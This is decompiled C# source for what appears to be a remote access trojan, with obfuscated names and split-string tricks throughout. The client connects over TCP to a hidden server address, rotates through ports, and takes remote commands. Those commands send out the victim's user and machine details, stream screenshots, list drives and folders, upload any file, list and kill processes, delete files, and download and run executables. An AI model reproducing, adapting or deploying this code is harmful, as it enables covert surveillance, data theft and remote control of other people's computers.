using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace narthimesa;

public class MEADRM
{
	private MRAEINF narthimesaUPC;

	private int narthimesascrSize = 200;

	private ThreadStart narthimesafunStarter;

	public TcpClient narthimesatcpsck;

	public NetworkStream narthimesanetStream;

	private int narthimesabuffSize = 1024;

	private DRZARIVF narthimesaHD = new DRZARIVF();

	public bool narthimesais_working = false;

	private Dictionary<string, byte[]> narthimesatasks = new Dictionary<string, byte[]>();

	private int narthimesabytesRead = 0;

	public bool narthimesareqCnls = false;

	public bool narthimesaautCnls = false;

	public DateTime narthimesalTimeUtc;

	private THRAARE narthimesaStateObj = new THRAARE();

	private bool narthimesaiswitch = false;

	public int port_sn = 0;

	private bool narthimesathrRuning = false;

	private bool narthimesastr_writer = false;

	private bool narthimesacapScreen = false;

	private Thread narthimesafunThread;

	private MemoryStream msStram = new MemoryStream();

	private SCRARNS narthimesacaps = new SCRARNS();

	private Bitmap image;

	public DateTime narthimesarunTime;

	public void narthimesasaveFile(string filePath)
	{
		try
		{
			byte[] array = narthimesapull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string narthimesafile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|narthimesa".Split(new char[1] { '|' })[0] : "<|narthimesa".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|narthimesa".Split(new char[1] { '|' })[0] : "<|narthimesa".Split(new char[1] { '|' })[0]);
			text = text + narthimesaget_size(fileInfo.Length) + ((!ret) ? ">|narthimesa".Split(new char[1] { '|' })[0] : "<|narthimesa".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				narthimesapush_data(null, "narthimesa@filsz=|narthimesa".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "".ToString();
		}
	}

	public void narthimesado_start()
	{
		try
		{
			narthimesarunTime = DateTime.Now;
			CEAZRNF.narthimesaport = CEAZRNF.ports[0];
			narthimesaUPC = new MRAEINF();
			narthimesaHD.iserver = this;
			narthimesaHD.narthimesamainPath = CEAZRNF.narthimesaget_mpath();
			TimerCallback callback = narthimesalookupCon;
			Timer narthimesatimer = new Timer(callback, narthimesaStateObj, 61210, 65210);
			narthimesaStateObj.narthimesatimer = narthimesatimer;
		}
		catch (Exception)
		{
		}
	}

	private bool narthimesaISCons()
	{
		try
		{
			CEAZRNF.narthimesadefaultP = narthimesaserverIPD();
			narthimesatcpsck = new TcpClient();
			narthimesatcpsck.Connect(CEAZRNF.narthimesadefaultP, CEAZRNF.narthimesaport);
			return true;
		}
		catch (Exception)
		{
			narthimesaports_switch();
			return false;
		}
	}

	public void narthimesaports_switch()
	{
		try
		{
			port_sn++;
			CEAZRNF.narthimesaport = CEAZRNF.ports[port_sn];
			if (port_sn >= CEAZRNF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool narthimesasend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				narthimesapush_data(data, "narthimesa@afile=" + fileinfo);
				return false;
			}
			narthimesapush_data(null, "narthimesa@anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void narthimesalookupCon(object disurce)
	{
		try
		{
			if (!narthimesathrRuning)
			{
				narthimesathrRuning = true;
				narthimesacheckLastatime(DateTime.Now);
				if (!narthimesais_working || !narthimesatcpsck.Connected)
				{
					narthimesais_working = narthimesaISCons();
					if (narthimesais_working)
					{
						narthimesabuffSize = narthimesatcpsck.ReceiveBufferSize;
						narthimesaseeRsp();
					}
				}
			}
			narthimesathrRuning = false;
		}
		catch (Exception)
		{
			narthimesathrRuning = false;
			narthimesastr_writer = false;
			narthimesais_working = false;
			narthimesaiswitch = false;
		}
	}

	public void narthimesalist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				try
				{
					text = text + processes[i].Id + ">|narthimesa".Split(new char[1] { '|' })[0];
					text = text + processes[i].ProcessName + ">|narthimesa".Split(new char[1] { '|' })[0];
					text += "0>|narthimesa".Split(new char[1] { '|' })[0];
					text += "<";
				}
				catch
				{
				}
			}
			byte[] byteArray = CEAZRNF.getByteArray(text);
			narthimesapush_data(byteArray, cmd + "=prodcess|narthimesa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void narthimesaload_app()
	{
		try
		{
			string path = CEAZRNF.narthimesaget_mpath() + CEAZRNF.narthimesamainApp + ".exe|narthimesa".Split(new char[1] { '|' })[0].ToString();
			Thread.Sleep(12);
			CEAZRNF.narthimesaset_run("hsatb|narthimesa".Split(new char[1] { '|' })[0], path);
		}
		catch
		{
		}
	}

	private void narthimesaimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|narthimesa".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|narthimesa".Split(new char[1] { '|' })[0];
				text = text + narthimesaget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				narthimesapush_data(memoryStream.ToArray(), "narthimesa@thumb=|narthimesa".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void narthimesasee_scren(string screenSize)
	{
		try
		{
			narthimesascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = narthimesacaps.narthimesascreen(narthimesascrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			narthimesapush_data(msStram.ToArray(), "narthimesa@sascr=narthimesa|narthimesa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void narthimesais_screen(string screenSize)
	{
		try
		{
			narthimesascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (narthimesacapScreen && narthimesais_working)
			{
				image = narthimesacaps.narthimesascreen(narthimesascrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				narthimesapush_data(msStram.ToArray(), "narthimesa@scren=narthimesa|narthimesa".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void narthimesauser_info()
	{
		try
		{
			string text = narthimesaUPC.narthimesalancard + "|" + narthimesaUPC.narthimesacname + "-2|" + narthimesaUPC.narthimesauname + "|" + narthimesaUPC.narthimesauip + "|" + CEAZRNF.narthimesaOsname() + "|" + narthimesaUPC.narthimesaapver + "|";
			text += "| !narthimesa".Split(new char[1] { '!' })[0];
			text = text + "|" + narthimesaUPC.narthimesaclientNum;
			text = text + "|" + CEAZRNF.narthimesaget_mpath();
			byte[] byteArray = CEAZRNF.getByteArray(text);
			narthimesapush_data(byteArray, "narthimesa@info=user|narthimesa".Split(new char[1] { '|' })[0]);
		}
		catch (Exception)
		{
		}
	}

	private void narthimesapush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				narthimesapush_data(File.ReadAllBytes(lfile), "narthimesa@file=|narthimesa".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void narthimesaremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string narthimesaget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|narthimesa".Split(new char[1] { '|' })[0],
				"KB|narthimesa".Split(new char[1] { '|' })[0],
				"MB|narthimesa".Split(new char[1] { '|' })[0],
				"GB|narthimesa".Split(new char[1] { '|' })[0],
				"TB|narthimesa".Split(new char[1] { '|' })[0],
				"PB|narthimesa".Split(new char[1] { '|' })[0],
				"EB|narthimesa".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "0";
		}
	}

	public string[] narthimesaget_command()
	{
		try
		{
			byte[] array = new byte[5];
			narthimesabytesRead = narthimesanetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= narthimesabytesRead)
			{
				int count = ((num3 > narthimesabuffSize) ? narthimesabuffSize : num3);
				narthimesabytesRead = narthimesanetStream.Read(array2, num2, count);
				num2 += narthimesabytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			narthimesais_working = false;
			return null;
		}
	}

	private void narthimesacheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(narthimesarunTime.Subtract(mTimeUtc).Minutes);
			if (num > 3)
			{
				narthimesatcpsck.Close();
				narthimesais_working = false;
			}
		}
		catch
		{
		}
	}

	public byte[] narthimesapull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			narthimesabytesRead = narthimesanetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !narthimesareqCnls)
			{
				int count = ((num3 > narthimesabuffSize) ? narthimesabuffSize : num3);
				narthimesabytesRead = narthimesanetStream.Read(array2, num, count);
				num += narthimesabytesRead;
				num3 -= narthimesabytesRead;
				narthimesarunTime = DateTime.Now;
			}
			if (narthimesareqCnls)
			{
				narthimesanetStream.Flush();
				while (narthimesanetStream.DataAvailable && narthimesanetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			narthimesais_working = false;
			return null;
		}
	}

	private void narthimesalistDrives()
	{
		string text = narthimesaHD.narthimesalookup_Drives();
		narthimesapush_data(null, "narthimesa@dirs=" + text);
	}

	private void narthimesaseeRsp()
	{
		if (!narthimesaiswitch)
		{
			narthimesaiswitch = true;
			narthimesanetStream = narthimesaNS(narthimesatcpsck);
			narthimesacapScreen = false;
			while (narthimesais_working)
			{
				string[] switchType = narthimesaget_command();
				if (switchType != null)
				{
					narthimesareqCnls = false;
					string cmdInfo = switchType[0].ToLower();
					if (cmdInfo.Split(new char[1] { '@' }).Length > 1)
					{
						cmdInfo = "narthimesa@" + cmdInfo.Split(new char[1] { '@' })[1];
					}
					else
					{
						cmdInfo = "narthimesa@" + cmdInfo;
					}
					if (cmdInfo == "narthimesa@info")
					{
						narthimesauser_info();
						continue;
					}
					if (cmdInfo == "narthimesa@filsz")
					{
						narthimesafunStarter = delegate
						{
							narthimesafile_info(switchType[1].ToString());
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						continue;
					}
					if (cmdInfo == "narthimesa@fldr")
					{
						string Folders = narthimesaHD.narthimesacheck_Folder(switchType[1]);
						if (Folders != "")
						{
							narthimesafunStarter = delegate
							{
								narthimesapush_data(null, "narthimesa@fldr=|narthimesa".Split(new char[1] { '|' })[0] + Folders);
							};
							narthimesafunThread = new Thread(narthimesafunStarter);
							narthimesafunThread.Start();
						}
						continue;
					}
					if (cmdInfo == "narthimesa@endpo")
					{
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim().ToString())).Kill();
						}
						catch
						{
						}
						continue;
					}
					if (cmdInfo == "narthimesa@thumb")
					{
						narthimesaimage_info(switchType[1].ToString());
						continue;
					}
					switch (cmdInfo.ToString())
					{
					case "narthimesa@runf":
						narthimesado_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "narthimesa@clping":
						narthimesarunTime = DateTime.Now;
						break;
					case "narthimesa@cscreen":
						narthimesasee_scren(switchType[1]);
						break;
					case "narthimesa@procl":
						narthimesafunStarter = delegate
						{
							narthimesalist_processes(cmdInfo);
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						break;
					}
					switch (cmdInfo.ToString())
					{
					case "narthimesa@scren":
						narthimesacapScreen = true;
						narthimesafunStarter = delegate
						{
							narthimesais_screen(switchType[1]);
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						break;
					case "narthimesa@dirs":
						narthimesafunThread = new Thread(narthimesalistDrives);
						narthimesafunThread.Start();
						break;
					case "narthimesa@dowr":
					case "narthimesa@dowf":
						narthimesasaveFile(switchType[1]);
						break;
					}
					switch (cmdInfo.ToString())
					{
					case "narthimesa@fles":
					{
						string files = narthimesaHD.narthimesalookup_File(switchType[1]);
						if (files != "")
						{
							narthimesafunStarter = delegate
							{
								narthimesapush_data(null, "narthimesa@fles=|narthimesa".Split(new char[1] { '|' })[0] + files);
							};
							narthimesafunThread = new Thread(narthimesafunStarter);
							narthimesafunThread.Start();
						}
						break;
					}
					case "narthimesa@file":
						narthimesafunStarter = delegate
						{
							narthimesapush_file(switchType[1]);
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						break;
					case "narthimesa@listf":
						narthimesafunStarter = delegate
						{
							narthimesaHD.narthimesalook_File(switchType[1]);
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						break;
					}
					switch (cmdInfo.ToString())
					{
					case "narthimesa@afile":
						narthimesafunStarter = delegate
						{
							narthimesasend_auto(switchType[1]);
						};
						narthimesafunThread = new Thread(narthimesafunStarter);
						narthimesafunThread.Start();
						break;
					case "narthimesa@delt":
						narthimesaremove_file(switchType[1]);
						break;
					case "narthimesa@udlt":
						narthimesaremove_user();
						break;
					case "narthimesa@cnls":
						narthimesaautCnls = true;
						narthimesareqCnls = true;
						narthimesacapScreen = false;
						break;
					}
					continue;
				}
				narthimesais_working = false;
				break;
			}
			narthimesais_working = false;
			narthimesacapScreen = false;
		}
		narthimesaiswitch = false;
	}

	public NetworkStream narthimesaNS(TcpClient narthimesatcpsck)
	{
		return narthimesatcpsck.GetStream();
	}

	public string narthimesaserverIPD()
	{
		return Encoding.UTF8.GetString(CEAZRNF.narthimesavpsips, 0, CEAZRNF.narthimesavpsips.Length);
	}

	public void narthimesado_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void narthimesaremove_user()
	{
		try
		{
			byte[] array = narthimesapull_data();
			if (array != null)
			{
				if (!File.Exists(CEAZRNF.narthimesaget_mpath() + CEAZRNF.narthimesaremvUser + ".exe"))
				{
					File.WriteAllBytes(CEAZRNF.narthimesaget_mpath() + CEAZRNF.narthimesaremvUser + ".exe", array);
				}
				narthimesado_process(CEAZRNF.narthimesaget_mpath() + CEAZRNF.narthimesaremvUser + ".exe".ToString());
			}
		}
		catch
		{
		}
	}

	public bool narthimesapush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (narthimesastr_writer)
			{
				return false;
			}
			narthimesastr_writer = true;
			byte[] byteArray = CEAZRNF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !narthimesareqCnls)
			{
				int num5 = ((num4 > narthimesabuffSize) ? narthimesabuffSize : num4);
				narthimesanetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				narthimesarunTime = DateTime.Now;
			}
			narthimesastr_writer = false;
			if (narthimesareqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			narthimesastr_writer = false;
			narthimesais_working = false;
			return false;
		}
	}
}
